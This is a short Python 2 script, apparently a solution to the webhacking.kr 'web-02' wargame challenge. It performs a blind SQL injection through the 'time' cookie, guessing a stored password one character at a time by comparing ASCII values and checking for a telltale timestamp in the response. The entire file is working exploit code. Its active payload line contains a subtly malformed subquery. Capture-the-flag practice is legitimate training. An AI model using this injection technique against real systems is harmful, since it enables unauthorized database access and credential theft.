import urllib2, re

session_id="3bb9114aa60b7cda5d6ee6ba78bdbadd"
password=''

asciilist=[]
for i in xrange(33,127):
    asciilist.append(i)

for i in range(10):
    for j in asciilist:
        url="http://webhacking.kr/challenge/web/web-02/index.php"
        request=urllib2.Request(url)
        #request.add_header('Cookie',"time=1506767624 AND (select ascii(substr(password, %d, 1)) from FreeB0aRd) = %d; PHPSESSID=%s" % (i, j, session_id))
        request.add_header('Cookie',"time=1506767624 AND (select ascii(substr(select table_name from information_schema.tables where information_schema=database(), %d, 1)) from FreeB0aRd) = %d; PHPSESSID=%s" % (i, j, session_id))
        res=urllib2.urlopen(request).read()
        flag=re.findall("<!--2070-01-01 09:00:01--></td>",res)
        if flag:
            password=password+chr(j)
            print "ascii matched = " + chr(j)
            print "current password = " + password
            break
print "@@@ Password of FreeB0aRd table = %s" %(password)
